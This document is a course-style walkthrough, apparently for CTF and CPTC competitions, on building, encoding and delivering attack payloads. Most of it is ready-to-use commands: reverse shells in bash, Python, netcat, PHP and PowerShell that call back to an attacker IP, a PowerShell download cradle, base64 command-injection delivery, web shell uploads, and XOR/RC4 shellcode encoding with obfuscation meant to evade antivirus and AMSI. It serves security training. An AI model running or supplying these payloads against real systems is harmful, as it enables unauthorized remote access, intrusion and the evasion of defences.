# Payload Generator Walkthrough

**Skill Level**: Intermediate [I]

A comprehensive guide to payload generation, encoding, and delivery for CTF and CPTC competitions.

> **New to security?** Review the [Glossary](../GLOSSARY.md) for definitions of technical terms. This walkthrough assumes you have completed Phase 1 (Network Reconnaissance).

---

## Prerequisites

Before starting this walkthrough, ensure you:

- [ ] Completed the Network Scanner Walkthrough
- [ ] Understand what TCP connections are (client connects to server)
- [ ] Know what a command-line shell is (bash, cmd, PowerShell)
- [ ] Have access to a test environment (never test on unauthorized systems)

**Required Knowledge**:
- What an IP address and port are
- Basic command-line usage
- How to run Python scripts

**Recommended Reading**: [Glossary](../GLOSSARY.md) entries for: Payload, Reverse Shell, Handler, Encoding, Obfuscation

---

## Module Overview

### Purpose
Master the creation and deployment of payloads for establishing remote access during authorized security assessments. This module covers shell generation, encoding techniques, and handler setup.

> **What is a payload?** Simply put, a payload is code designed to run on a target system. In penetration testing, payloads typically give you remote access to a system - like being able to type commands on a computer that is not in front of you.

### Learning Objectives
By completing this walkthrough, you will be able to:
- Generate reverse shells for multiple platforms and languages
- Apply appropriate encoding and obfuscation techniques
- Set up shell handlers to receive connections
- Encode shellcode to avoid signature detection
- Understand detection vectors and operational considerations

### Time Estimate
- Reading: 60 minutes
- Hands-on Practice: 2-3 hours

---

## Part 1: Conceptual Foundation

### Understanding Shells

#### Shell Types

| Type | Direction | Use Case | Detection Risk |
|------|-----------|----------|----------------|
| **Reverse Shell** | Target connects to attacker | Target behind NAT/firewall | Outbound connection |
| **Bind Shell** | Attacker connects to target | Target has public IP | Listening port |
| **Web Shell** | HTTP-based command execution | Web application compromise | File on disk |

> **Plain English Explanation:**
> - **Reverse Shell**: The target calls YOU. Like giving someone your phone number and having them call you back.
> - **Bind Shell**: YOU call the target. The target opens a "phone line" and waits for your call.
> - **Web Shell**: A webpage that runs commands. You interact through your browser.

#### Reverse Shell Architecture

```
ATTACKER                                    TARGET
(Your Machine)                              (Compromised Host)

+-------------+                             +-------------+
|   Handler   | <------ TCP Connection ---- |   Payload   |
|  (Listener) |                             | (Executed)  |
| Port: 4444  | -------- Commands --------> |             |
|             | <------- Output ----------- |             |
+-------------+                             +-------------+

1. Attacker starts handler (listens on port)
2. Target executes payload (connects back)
3. Handler receives connection
4. Bidirectional shell communication established
```

#### Why Reverse Shells Work

```
SCENARIO: Target behind corporate firewall

                    FIREWALL
                       |
                       | [Blocks inbound connections]
                       | [Allows outbound HTTP/HTTPS]
                       |
    ATTACKER ----X---- | ----X---- TARGET  (Bind shell blocked)
                       |
    ATTACKER <-------- | <-------- TARGET  (Reverse shell works)
                       |
                  [Outbound allowed]
```

### Detection Vectors

Understanding how payloads get detected helps you choose appropriate techniques:

| Detection Method | What It Catches | Evasion Approach |
|------------------|-----------------|------------------|
| **Signature-based AV** | Known payload patterns | Encoding, obfuscation |
| **Behavioral Analysis** | Suspicious process actions | Living-off-the-land |
| **Network Monitoring** | Unusual outbound connections | Encrypted channels |
| **Script Block Logging** | PowerShell commands | AMSI bypass, encoding |
| **AMSI** | Malicious script content | AMSI bypass techniques |

> **Term Definitions:**
> - **AV (Antivirus)**: Software that looks for known malicious patterns (signatures)
> - **AMSI (Antimalware Scan Interface)**: Windows feature that scans scripts before execution
> - **Living-off-the-land**: Using built-in system tools instead of custom malware
> - **Behavioral Analysis**: Detecting threats by what they DO, not what they look like

> **OPSEC Note**: Modern security tools use multiple detection methods simultaneously. A payload that evades signatures may still be caught by behavioral analysis. Always assume your payloads will be logged somewhere.

### Operational Considerations

Before generating payloads, consider:

1. **Target Platform**: Windows, Linux, or cross-platform?
2. **Available Interpreters**: Python, PowerShell, Bash, PHP?
3. **Network Restrictions**: Can the target reach your listener?
4. **Security Controls**: AV, EDR, AMSI present?
5. **Delivery Method**: How will the payload reach the target?

---

## Part 2: Payload Generator Deep-Dive

### Tool Location

```
/path/to/tools/payload-generator/payload_generator.py
```

### Core Capabilities

- **Multiple Payload Types**: Reverse shells, bind shells, web shells
- **Multi-Language Support**: Python, PowerShell, Bash, PHP
- **Encoding Options**: Base64, Hex
- **Obfuscation Levels**: 0-3 (none to advanced)
- **Planning Mode**: Preview before generation

### Listing Available Payloads

```bash
python3 payload_generator.py --list
```

**Expected Output:**
```
Available Payloads:
====================

REVERSE SHELLS:
  python       Python reverse shell (cross-platform)
  powershell   PowerShell reverse shell (Windows)
  bash         Bash reverse shell (Linux/Unix)
  php          PHP reverse shell (Web servers)

BIND SHELLS:
  python       Python bind shell

WEB SHELLS:
  php          PHP web shell
```

### Basic Payload Generation

#### Pattern 1: Python Reverse Shell

```bash
# Preview first
python3 payload_generator.py \
    --type reverse_shell \
    --lang python \
    --lhost 10.10.14.5 \
    --lport 4444 \
    --plan
```

**Plan Output:**
```
[PLAN MODE] Tool: payload-generator
==================================================

Configuration:
  Payload Type: reverse_shell
  Language: python
  Target Host (LHOST): 10.10.14.5
  Target Port (LPORT): 4444
  Encoding: none
  Obfuscation: 0

Actions to be performed:
  1. Load python reverse_shell template
  2. Substitute connection parameters (LHOST/LPORT)
  3. Output generated payload to stdout

Detection Considerations:
  - socket module usage
  - subprocess spawning
  - Outbound TCP connection
```

```bash
# Generate the payload
python3 payload_generator.py \
    --type reverse_shell \
    --lang python \
    --lhost 10.10.14.5 \
    --lport 4444
```

**Generated Payload:**
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

#### Pattern 2: PowerShell Reverse Shell

```bash
python3 payload_generator.py \
    --type reverse_shell \
    --lang powershell \
    --lhost 10.10.14.5 \
    --lport 443 \
    --plan
```

```bash
# Generate with base64 encoding for command-line delivery
python3 payload_generator.py \
    --type reverse_shell \
    --lang powershell \
    --lhost 10.10.14.5 \
    --lport 443 \
    --encoding base64
```

#### Pattern 3: Bash Reverse Shell

```bash
python3 payload_generator.py \
    --type reverse_shell \
    --lang bash \
    --lhost 10.10.14.5 \
    --lport 4444
```

**Generated Payload:**
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### Encoding and Obfuscation

#### Base64 Encoding

Useful for avoiding special character issues in delivery:

```bash
python3 payload_generator.py \
    --type reverse_shell \
    --lang powershell \
    --lhost 10.10.14.5 \
    --encoding base64
```

**Usage on target:**
```powershell
powershell -enc <base64_string>
```

#### Hex Encoding

```bash
python3 payload_generator.py \
    --type reverse_shell \
    --lang python \
    --lhost 10.10.14.5 \
    --encoding hex
```

#### Obfuscation Levels

| Level | Description | Use Case |
|-------|-------------|----------|
| 0 | No obfuscation | Testing, known-safe environments |
| 1 | Basic string manipulation | Light AV evasion |
| 2 | Additional encoding, variable obfuscation | Moderate security |
| 3 | Advanced techniques | High-security environments |

> **What is obfuscation?** Making code harder to understand or detect. Like writing a message in code - the meaning is the same, but it looks different. Security software may not recognize an obfuscated payload even if it would detect the original.

> **Detection Awareness**: Basic obfuscation (levels 1-2) may evade signature-based antivirus but is unlikely to fool modern EDR solutions. Do not rely on obfuscation alone for environments with advanced security monitoring.

```bash
# Level 2 obfuscation
python3 payload_generator.py \
    --type reverse_shell \
    --lang powershell \
    --lhost 10.10.14.5 \
    --obfuscate 2
```

### JSON Output for Automation

```bash
python3 payload_generator.py \
    --type reverse_shell \
    --lang python \
    --lhost 10.10.14.5 \
    --json
```

**Output:**
```json
{
  "payload_type": "reverse_shell",
  "language": "python",
  "lhost": "10.10.14.5",
  "lport": 4444,
  "encoding": "none",
  "obfuscation_level": 0,
  "payload": "import socket,subprocess,os...",
  "detection_vectors": [
    "socket module usage",
    "subprocess spawning",
    "Outbound TCP connection"
  ]
}
```

### Web Shell Generation

```bash
python3 payload_generator.py \
    --type web_shell \
    --lang php \
    --obfuscate 1
```

**Usage:**
1. Upload generated web shell to target web server
2. Access via browser: `http://target/shell.php?cmd=whoami`

---

## Part 3: Shellcode Encoder Deep-Dive

### Tool Location

```
/path/to/tools/shellcode-encoder/shellcode_encoder.py
```

### Core Capabilities

- Multiple encoding algorithms (XOR, RC4, ADD, ROT)
- Chain encoding for layered obfuscation
- Bad character avoidance
- Multiple output formats (C, Python, PowerShell, C#)
- Decoder stub generation

### When to Use Shellcode Encoding

| Scenario | Recommended Encoding |
|----------|---------------------|
| Basic AV evasion | XOR with custom key |
| Moderate security | Chain (XOR + ADD) |
| High security | RC4 + custom decoder |
| Null byte constraints | XOR with null-free key |

### Basic Encoding

#### XOR Encoding

```bash
# Encode shellcode from file
python3 shellcode_encoder.py \
    --input shellcode.bin \
    --encoding xor \
    --plan
```

```bash
# Execute encoding
python3 shellcode_encoder.py \
    --input shellcode.bin \
    --encoding xor \
    --format python
```

**Output:**
```python
# XOR Key: 0xAB
# Original size: 276 bytes
# Encoded size: 276 bytes
sc = b"\x9a\x7b\xfb\x23..."

def decode(encoded, key):
    return bytes([b ^ key for b in encoded])
```

#### Encoding Hex String Input

```bash
# Encode hex string directly
python3 shellcode_encoder.py \
    --input "\x31\xc0\x50\x68\x2f\x2f\x73\x68" \
    --encoding xor \
    --format c_array
```

**Output:**
```c
// XOR Key: 0xAB
unsigned char sc[] = {
    0x9a, 0x6b, 0xfb, 0xc3, 0x84, 0x84, 0xd8, 0xc3
};
unsigned char key = 0xAB;
```

### Chain Encoding

Apply multiple encoders in sequence:

```bash
python3 shellcode_encoder.py \
    --input shellcode.bin \
    --chain xor,add,rot \
    --format python \
    --plan
```

**Plan Output:**
```
[PLAN MODE] Shellcode Encoder
==================================================

Configuration:
  Input: shellcode.bin (276 bytes)
  Chain: xor -> add -> rot
  Output Format: python

Encoding Chain:
  Step 1: XOR encoding (key will be generated)
  Step 2: ADD encoding (key will be generated)
  Step 3: ROT encoding (key will be generated)

Note: Decoding must happen in reverse order (rot -> add -> xor)
```

### Bad Character Avoidance

Ensure encoded output avoids problematic bytes:

```bash
# Avoid null bytes, newlines, carriage returns
python3 shellcode_encoder.py \
    --input shellcode.bin \
    --encoding xor \
    --bad-chars 000a0d \
    --null-free
```

### Shellcode Analysis

Analyze shellcode characteristics before encoding:

```bash
python3 shellcode_encoder.py \
    --input shellcode.bin \
    --analyze
```

**Output:**
```
Shellcode Analysis:
====================
Size:           276 bytes
Entropy:        5.82
Null bytes:     12 (4.3%)
Bad chars:      \x00 at positions: 5, 23, 67, 89...

Character Distribution:
  \x00-\x1f:    45 (16.3%)
  \x20-\x7e:    156 (56.5%)
  \x7f-\xff:    75 (27.2%)
```

### Output Formats

| Format | Use Case | Example Command |
|--------|----------|-----------------|
| `raw` | Direct use | `--format raw` |
| `hex` | Scripting | `--format hex` |
| `c_array` | C/C++ loaders | `--format c_array` |
| `python` | Python loaders | `--format python` |
| `powershell` | PowerShell loaders | `--format powershell` |
| `csharp` | C# loaders | `--format csharp` |

---

## Part 4: Reverse Shell Handler Deep-Dive

### Tool Location

```
/path/to/tools/reverse-shell-handler/tool.py
```

### Core Capabilities

- Multi-session handling
- SSL/TLS encryption
- Session management (background, resume)
- Built-in payload generation

### Basic Handler Setup

```bash
# Preview handler setup
python3 tool.py -l 4444 --plan
```

```bash
# Start basic listener
python3 tool.py -l 4444
```

**Output:**
```
================================================================================
  REVERSE SHELL HANDLER
================================================================================

[*] Handler listening on 0.0.0.0:4444
[*] Waiting for connection...
```

### SSL/TLS Encrypted Handler

For environments with traffic inspection:

```bash
# Generate self-signed cert (one-time setup)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Start encrypted handler
python3 tool.py -l 443 --ssl --ssl-cert cert.pem --ssl-key key.pem
```

### Multi-Session Mode

Handle multiple simultaneous connections:

```bash
python3 tool.py -l 4444 --multi
```

**Session Management:**
```
[+] Connection from 192.168.1.100:54321
[+] Session ID: 1

[+] Connection from 192.168.1.101:54322
[+] Session ID: 2

sessions       # List all sessions
interact 1     # Switch to session 1
background     # Return to handler (keep session alive)
kill 2         # Terminate session 2
```

### Generating Payloads from Handler

```bash
# Show payloads configured for your listener
python3 tool.py --payloads -H 10.10.14.5 -l 4444
```

**Output:**
```
Generated Payloads for 10.10.14.5:4444
========================================

BASH:
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

BASH (Base64):
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ== | base64 -d | bash

PYTHON:
python -c 'import socket,subprocess,os;s=socket.socket(...)'

NETCAT:
nc -e /bin/sh 10.10.14.5 4444

NETCAT (no -e):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

PHP:
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

POWERSHELL:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);..."
```

---

## Part 5: Payload Delivery Strategies

### Delivery Method Selection

| Method | Scenario | Considerations |
|--------|----------|----------------|
| **Command Injection** | Web app with injectable input | Encode for shell context |
| **File Upload** | Web app accepts file uploads | File extension filtering |
| **Phishing** | Social engineering | User interaction required |
| **Service Exploitation** | Vulnerable service discovered | Payload format constraints |
| **Scheduled Tasks** | Persistence mechanism | Timing and permissions |

### Command Injection Delivery

```bash
# URL-encode payload for web delivery
python3 payload_generator.py \
    --type reverse_shell \
    --lang bash \
    --lhost 10.10.14.5 \
    --encoding base64
```

**Delivery:**
```bash
# In vulnerable parameter
; echo <base64_payload> | base64 -d | bash
```

### File Upload Delivery

```bash
# Generate PHP web shell
python3 payload_generator.py \
    --type web_shell \
    --lang php \
    --obfuscate 2 > shell.php

# Or generate PHP reverse shell
python3 payload_generator.py \
    --type reverse_shell \
    --lang php \
    --lhost 10.10.14.5 > revshell.php
```

### PowerShell Delivery

```bash
# Generate encoded PowerShell payload
python3 payload_generator.py \
    --type reverse_shell \
    --lang powershell \
    --lhost 10.10.14.5 \
    --encoding base64
```

**Delivery Options:**
```powershell
# Direct execution
powershell -enc <base64_payload>

# Download cradle
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"

# With execution policy bypass
powershell -ep bypass -c "..."
```

---

## Part 6: Complete Workflow Example

### Scenario: Web Server Compromise

You have discovered a command injection vulnerability in a web application.

#### Step 1: Set Up Handler

```bash
# Terminal 1: Start handler
python3 /path/to/reverse-shell-handler/tool.py -l 4444
```

#### Step 2: Generate Payload

```bash
# Terminal 2: Generate appropriate payload
python3 /path/to/payload-generator/payload_generator.py \
    --type reverse_shell \
    --lang bash \
    --lhost <your_ip> \
    --lport 4444
```

**Output:**
```bash
bash -i >& /dev/tcp/<your_ip>/4444 0>&1
```

#### Step 3: Encode for Delivery

If special characters cause issues:

```bash
# Base64 encode
echo "bash -i >& /dev/tcp/<your_ip>/4444 0>&1" | base64
```

**Payload wrapper:**
```bash
echo YmFzaCAtaSA+Ji... | base64 -d | bash
```

#### Step 4: Deliver Payload

Inject into vulnerable parameter:
```
http://target/vuln.php?cmd=echo+YmFzaCAtaSA...+|+base64+-d+|+bash
```

#### Step 5: Receive Connection

**Handler Output:**
```
[+] Connection from 192.168.1.100:54321
[+] Session ID: 1

[*] Interacting with session 1 (192.168.1.100:54321)
[*] Type 'background' to return to handler, 'exit' to close session

$ whoami
www-data
$ hostname
web-server-01
```

---

## Part 7: Troubleshooting

### Issue: No connection received

**Possible Causes:**
1. Firewall blocking outbound connections
2. Wrong LHOST/LPORT in payload
3. Handler not running
4. Network routing issues

**Solutions:**
```bash
# Verify handler is listening
netstat -tlnp | grep 4444

# Test with common ports (80, 443)
python3 tool.py -l 443

# Verify your IP is reachable from target
# Check firewall rules on your machine
```

### Issue: Shell dies immediately

**Possible Causes:**
1. Missing interpreter on target
2. Process killed by security software
3. Connection interrupted

**Solutions:**
```bash
# Try different payload language
python3 payload_generator.py --type reverse_shell --lang python
python3 payload_generator.py --type reverse_shell --lang php

# Use stable shells
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Issue: Payload detected by AV

**Solutions:**
```bash
# Apply obfuscation
python3 payload_generator.py \
    --type reverse_shell \
    --lang powershell \
    --obfuscate 3

# Use encoded shellcode
python3 shellcode_encoder.py \
    --input payload.bin \
    --chain xor,rc4 \
    --format powershell
```

### Issue: Shell not interactive

**Solution - Upgrade to PTY:**
```bash
# On target (Linux)
python -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background and configure terminal
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Part 8: Competition Tips

### Pre-Competition Checklist

- [ ] Payloads pre-generated for common scenarios
- [ ] Handler scripts ready to launch
- [ ] Encoding scripts prepared
- [ ] Network connectivity verified
- [ ] Firewall rules configured (allow inbound on handler ports)

### Quick Payload Reference

| Target | Payload | Command |
|--------|---------|---------|
| Linux | Bash | `--type reverse_shell --lang bash` |
| Linux | Python | `--type reverse_shell --lang python` |
| Windows | PowerShell | `--type reverse_shell --lang powershell` |
| Web | PHP | `--type reverse_shell --lang php` |
| Web | Web Shell | `--type web_shell --lang php` |

### Time-Saving Tips

1. **Pre-generate common payloads** with your IP
2. **Keep handler running** in a dedicated terminal
3. **Use screen/tmux** for session management
4. **Document successful payloads** for re-use

### One-Liner Command Chain

```bash
# Generate payload and copy to clipboard (Linux)
python3 payload_generator.py --type reverse_shell --lang bash --lhost $(hostname -I | awk '{print $1}') | xclip -selection clipboard

# Start handler in background
python3 tool.py -l 4444 &
```

---

## Summary Checklist

Before moving to evasion techniques:

- [ ] Can generate reverse shells for Linux and Windows
- [ ] Understand encoding options and when to use them
- [ ] Can set up handlers and manage sessions
- [ ] Know how to encode shellcode
- [ ] Understand detection vectors for each payload type
- [ ] Can troubleshoot common connection issues

---

## Next Steps

After completing this walkthrough:
1. Complete **Lab 04: Payload Delivery** for hands-on practice
2. Keep the **Payload Generation Cheatsheet** accessible
3. Progress to **EDR Evasion Walkthrough** for advanced techniques
